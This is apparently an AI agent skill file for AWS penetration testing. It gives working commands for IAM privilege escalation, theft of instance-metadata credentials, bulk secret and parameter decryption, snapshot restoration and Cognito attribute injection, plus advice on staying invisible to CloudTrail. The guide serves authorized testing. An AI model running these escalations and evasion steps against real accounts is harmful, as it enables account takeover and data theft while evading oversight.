---
name: aws
description: AWS cloud security testing - IAM privilege escalation, S3 exposure, IMDS SSRF credential theft, secrets extraction, Lambda/RDS/Cognito misconfigurations, and cross-account pivoting
---

# AWS Security Testing

AWS environments break primarily through identity: over-permissive IAM policies, leaked credentials, and assumable role chains that let a low-privileged principal walk to administrator. The control plane is a single API surface (`https://<service>.<region>.amazonaws.com`) authenticated by SigV4, so every misconfiguration is reachable from anywhere with valid credentials. The most common initial access is a leaked long-lived access key or an SSRF that reads instance-profile credentials from the metadata service. This skill covers testing from the perspective of holding (or stealing) AWS credentials. For the SSRF that delivers instance credentials, see the ssrf skill.

## Attack Surface

**Scope**
- IAM (users, groups, roles, policies, instance profiles) and STS (temporary credential issuance, `AssumeRole`)
- S3 buckets (object ACLs, bucket policies, ACLs, presigned URLs, static website hosting)
- EC2 (instances, AMIs, EBS snapshots, security groups, user-data, instance profiles)
- Lambda (function code, environment variables, execution roles, resource policies)
- Secrets Manager and SSM Parameter Store (`SecureString` parameters, secret values)
- Cognito (user pools, identity pools, unauthenticated identity grants)
- RDS / Aurora (instances, manual and automated snapshots, snapshot sharing)
- API Gateway (REST/HTTP APIs, authorizers, stage variables, resource policies)
- CloudTrail (logging coverage, multi-region trails, data-event blind spots)

**Entry Points**
- Long-lived access keys leaked in git history, CI logs, mobile app bundles, public AMIs, or EBS/RDS snapshots
- IMDS SSRF returning instance-profile credentials from a compromised EC2/ECS/EKS workload
- Public or weakly-scoped S3 buckets, Lambda function URLs, and API Gateway endpoints
- Cognito unauthenticated identity pools handing out usable AWS credentials to anonymous clients
- Federated/SSO entry via misconfigured SAML/OIDC trust policies on roles

**Identity / Credential Types**
- Long-lived IAM user keys (`AKIA...` prefix, paired with a secret key)
- Temporary STS credentials (`ASIA...` prefix, include a session token, time-limited)
- Instance-profile credentials delivered via IMDS (`http://169.254.169.254/...`), auto-rotated
- Federated credentials from `AssumeRoleWithSAML` / `AssumeRoleWithWebIdentity` (SSO, Cognito, GitHub OIDC)

## Key Vulnerabilities

### IAM Privilege Escalation Paths

A principal with seemingly limited permissions often holds one of the known escalation primitives. The highest-value paths: `iam:CreatePolicyVersion` (set a new default version granting `*`), `iam:PassRole` plus a service that runs roles (`ec2:RunInstances`, `lambda:CreateFunction`, `glue:CreateDevEndpoint`), `iam:AttachUserPolicy` / `iam:PutUserPolicy` (attach `AdministratorAccess` to self), `iam:CreateAccessKey` on another user, and `sts:AssumeRole` chains into more privileged roles.

**Test:**
```
aws sts get-caller-identity
aws iam list-attached-user-policies --user-name $(aws sts get-caller-identity --query Arn --output text | cut -d/ -f2)
# CreatePolicyVersion escalation: make a self-granting version the default
aws iam create-policy-version --policy-arn arn:aws:iam::<acct>:policy/<editable> \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' --set-as-default
# AttachUserPolicy escalation: grant self admin
aws iam attach-user-policy --user-name <me> --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
# PassRole + Lambda: run code as a privileged role
aws lambda create-function --function-name pwn --runtime python3.12 --role arn:aws:iam::<acct>:role/<privileged> \
  --handler index.handler --zip-file fileb://pwn.zip
```

### Over-Permissive Policies and Wildcards

Inline and managed policies with `"Action": "*"`, `"Resource": "*"`, wildcarded service actions (`s3:*`, `iam:*`), or `NotAction`/`NotResource` inversions that unintentionally grant broad access. Trust policies with `"Principal": {"AWS": "*"}` allow any account to assume the role.

**Test:**
```
aws iam get-account-authorization-details > auth.json
# cloudsplaining flags privilege-escalation, data-exfiltration, and resource-exposure findings
cloudsplaining scan --file auth.json
# find role trust policies assumable by any principal
aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument.Statement[?Principal.AWS==`*`]].RoleName'
```

### Public / Misconfigured S3 Buckets

Buckets exposed via bucket ACL (`AllUsers`/`AuthenticatedUsers` grants), permissive bucket policies, disabled Block Public Access, or object-level ACLs. Static-website buckets and presigned URLs (which embed `X-Amz-Signature` and remain valid until expiry, even for private objects) leak data.

**Test:**
```
aws s3api get-bucket-acl --bucket <bucket>
aws s3api get-bucket-policy --bucket <bucket>
aws s3api get-public-access-block --bucket <bucket>
# unauthenticated listing/read attempts
aws s3 ls s3://<bucket> --no-sign-request
curl -s https://<bucket>.s3.amazonaws.com/
# generate a presigned URL to a private object you can read
aws s3 presign s3://<bucket>/secret.txt --expires-in 3600
```

### IMDS SSRF to Instance Credentials

An SSRF on an EC2/ECS/EKS host reaching `169.254.169.254` yields the instance-profile role's temporary credentials. IMDSv1 (default on older instances) needs only a `GET`; IMDSv2 requires first obtaining a session token via `PUT` and sending it in `X-aws-ec2-metadata-token`. SSRFs that cannot send custom headers or `PUT` are blocked by IMDSv2 enforcement.

**Test:**
```
# IMDSv1 (no token required)
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
# IMDSv2 PUT-token flow
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
# ECS task role variant
curl -s http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI
```

### Leaked Access Keys

Credentials committed to git, baked into AMIs/snapshots, embedded in Lambda env vars, or written to EC2 user-data. Any `AKIA`/`ASIA` string plus a 40-char secret is a candidate. EC2 user-data and AMI/snapshot contents are frequently overlooked stores.

**Test:**
```
# scan a repo (filesystem or remote) for verified secrets
trufflehog git file://. --only-verified
trufflehog filesystem /mnt/extracted-ami --only-verified
# user-data often contains bootstrap credentials
aws ec2 describe-instance-attribute --instance-id <id> --attribute userData \
  --query 'UserData.Value' --output text | base64 -d
# validate any found key
AWS_ACCESS_KEY_ID=<k> AWS_SECRET_ACCESS_KEY=<s> aws sts get-caller-identity
```

### Secrets Manager / SSM Parameter Store Extraction

Principals with `secretsmanager:GetSecretValue` or `ssm:GetParameter*` can read stored credentials, often broader than intended via wildcard resources. `SecureString` SSM parameters decrypt transparently with `--with-decryption` when the caller can use the KMS key.

**Test:**
```
aws secretsmanager list-secrets --query 'SecretList[].Name'
aws secretsmanager get-secret-value --secret-id <name> --query SecretString --output text
aws ssm describe-parameters --query 'Parameters[].Name'
aws ssm get-parameters-by-path --path / --recursive --with-decryption \
  --query 'Parameters[].[Name,Value]' --output text
```

### Lambda Env-Var Secrets and Overprivileged Execution Roles

Lambda environment variables routinely hold DB passwords and API keys in plaintext (readable with `lambda:GetFunctionConfiguration`). The function's execution role is frequently over-scoped; combined with `PassRole`, attackers run code as that role.

**Test:**
```
aws lambda list-functions --query 'Functions[].[FunctionName,Role]' --output text
aws lambda get-function-configuration --function-name <fn> --query Environment.Variables
# download the deployment package to inspect for hardcoded secrets
aws lambda get-function --function-name <fn> --query Code.Location --output text
# inspect the execution role's permissions
aws iam list-attached-role-policies --role-name <exec-role>
```

### Public RDS Snapshots

Manual RDS/Aurora snapshots shared with `all` (public) or shared to an attacker-controlled account can be restored into the attacker's account, exposing the full database. Public snapshots are discoverable account-wide.

**Test:**
```
aws rds describe-db-snapshots --snapshot-type public --query 'DBSnapshots[].DBSnapshotIdentifier'
aws rds describe-db-snapshot-attributes --db-snapshot-identifier <snap> \
  --query 'DBSnapshotAttributesResult.DBSnapshotAttributes'
# restore a shared/public snapshot into your own account, then connect
aws rds restore-db-instance-from-db-snapshot --db-instance-identifier loot \
  --db-snapshot-identifier <snap>
```

### Cognito Misconfiguration

Unauthenticated identity pools hand AWS credentials to anonymous clients; the attached role's permissions then become anyone's. User pools with open self-signup allow attribute injection (setting `email_verified`, custom attributes, or `is_admin`-style claims the app trusts).

**Test:**
```
# anonymous credentials from an unauth identity pool
aws cognito-identity get-id --identity-pool-id <region>:<pool-id>
aws cognito-identity get-credentials-for-identity --identity-id <id>
# self-register with injected attributes (open signup)
aws cognito-idp sign-up --client-id <app-client> --username attacker \
  --password 'Pwn123!@#' --user-attributes Name=email,Value=a@b.c Name=custom:role,Value=admin
```

## Bypass Techniques

**Enumerate without logging**
- `enumerate-iam` brute-forces hundreds of read-only `List`/`Get`/`Describe` calls to map permissions when `iam:Get*` is denied; many calls are not logged as data events
- Prefer read-only describe calls during recon; CloudTrail records management events but data-plane S3/Lambda reads are off by default

**Cross-account assume-role**
- Roles whose trust policy allows your account (or `*`) are assumable across the account boundary: `aws sts assume-role --role-arn arn:aws:iam::<other>:role/<r> --role-session-name x`
- Chain roles: assumed creds may themselves hold `sts:AssumeRole` into deeper roles — repeat until you reach admin

**CloudTrail blind spots**
- S3 object-level and Lambda invoke events require data-event logging, usually disabled — read activity goes unrecorded
- A single-region trail misses actions performed in other regions
- Disrupting the trail (`cloudtrail:StopLogging`, `PutEventSelectors`) is itself logged, so prefer regions/services with no coverage

**Region hopping**
- Resources and trails are per-region; enumerate every region (`aws ec2 describe-regions`) because findings (snapshots, instances, secrets) hide in unused regions

## Testing Methodology

1. **Identify the principal** - `aws sts get-caller-identity` confirms account, user/role ARN, and whether creds are user (`AKIA`) or temporary (`ASIA`)
2. **Enumerate permissions** - `enumerate-iam` for brute-force mapping; `aws iam get-account-authorization-details` + `cloudsplaining` when you have IAM read
3. **Broad posture scan** - run `prowler aws` and `scout suite aws` for a full misconfiguration baseline across services
4. **Hunt privilege escalation** - run `pacu` and use its `iam__privesc_scan` module to detect known escalation paths automatically
5. **Find priv-esc primitive** - confirm one of: `CreatePolicyVersion`, `PassRole`+service, `AttachUserPolicy`, `CreateAccessKey`, assumable role
6. **Pivot** - assume more privileged roles, restore shared snapshots, read secrets, escalate to `AdministratorAccess`
7. **Map data stores** - enumerate S3, RDS snapshots, Secrets Manager, SSM, Lambda env vars across all regions

## Validation

1. Prove identity and access scope with `aws sts get-caller-identity` and a successful privileged read (non-destructive)
2. For IAM escalation, demonstrate the new permission with a read-only call that previously returned `AccessDenied`, not by deleting/modifying production resources
3. For S3, show object listing or a single benign object read (`aws s3 cp s3://<bucket>/<key> -`), not bulk download
4. For IMDS, retrieve and `get-caller-identity` with the instance-profile creds to confirm they are live and what role they grant
5. For assume-role chains, run `get-caller-identity` after each `assume-role` to prove the new principal
6. For snapshots, confirm the snapshot is shared/public via `describe-*-snapshot-attributes` without restoring production data

## False Positives

- `s3 ls --no-sign-request` succeeding on a bucket that intentionally hosts public static content (CDN origin)
- A role with `Principal: *` in its trust policy but a `Condition` (`sts:ExternalId`, `aws:PrincipalOrgID`, source-account) that actually restricts assumption
- Access keys found in code that are already deactivated/rotated - always validate with `get-caller-identity`
- `prowler`/`ScoutSuite` flagging public-block disabled on a bucket whose object ACLs and policy still deny public read
- Cognito unauth pool whose attached role has an empty or deny-all policy - credentials issue but grant nothing

## Impact

- Full account takeover via IAM privilege escalation to `AdministratorAccess`
- Cross-account compromise through over-trusting role policies and assume-role chains
- Bulk data exfiltration from public S3 buckets, restorable RDS snapshots, and readable secrets
- Persistent backdoor access via new IAM users/keys, role trust modifications, or Lambda backdoors
- Lateral movement from a single compromised workload (IMDS creds) into the broader account
- Compute abuse (cryptomining) and resource destruction using escalated privileges

## Pro Tips

1. `ASIA` keys are temporary - they need the session token and expire; capture all three values and check `aws sts get-caller-identity` before relying on them
2. Run `enumerate-iam` first when `iam:Get*` is denied - it maps your real permissions without needing IAM read access
3. Pacu's `iam__privesc_scan` automates the 20+ known escalation paths; it finds primitives faster than manual policy review
4. Always enumerate every region - snapshots, secrets, and forgotten instances hide in regions the team never uses
5. IMDSv2 requires the `PUT`-then-header token flow; an SSRF limited to plain `GET` is blocked, so check the metadata options (`HttpTokens: required`) before assuming the host is exploitable
6. Presigned S3 URLs work for private objects and survive even after the bucket is locked down - they expire only on their own timer
7. `PassRole` is the linchpin of most escalation - audit which services you can pass roles to (`ec2`, `lambda`, `glue`, `cloudformation`, `sagemaker`) and which roles are passable
8. Lambda env vars and EC2 user-data are the two most reliable plaintext secret stores - check both before deeper digging
9. Prefer read-only `Describe`/`List`/`Get` calls during recon; data-event logging is usually off, so S3 reads stay invisible while management calls are recorded

## Summary

AWS compromise chains through identity: leaked keys or IMDS SSRF deliver an initial principal, permission enumeration (`enumerate-iam`, `cloudsplaining`, Pacu) reveals an escalation primitive (`CreatePolicyVersion`, `PassRole`+service, `AttachUserPolicy`, or an assumable role), and that primitive walks to administrator or pivots across accounts. Data stores - S3, RDS snapshots, Secrets Manager, SSM, Lambda env vars - are the loot, and CloudTrail's data-event blind spots keep much of the read activity invisible. Test the chain from caller identity to escalation to pivot, not isolated findings, and validate every credential with `get-caller-identity` before trusting it.
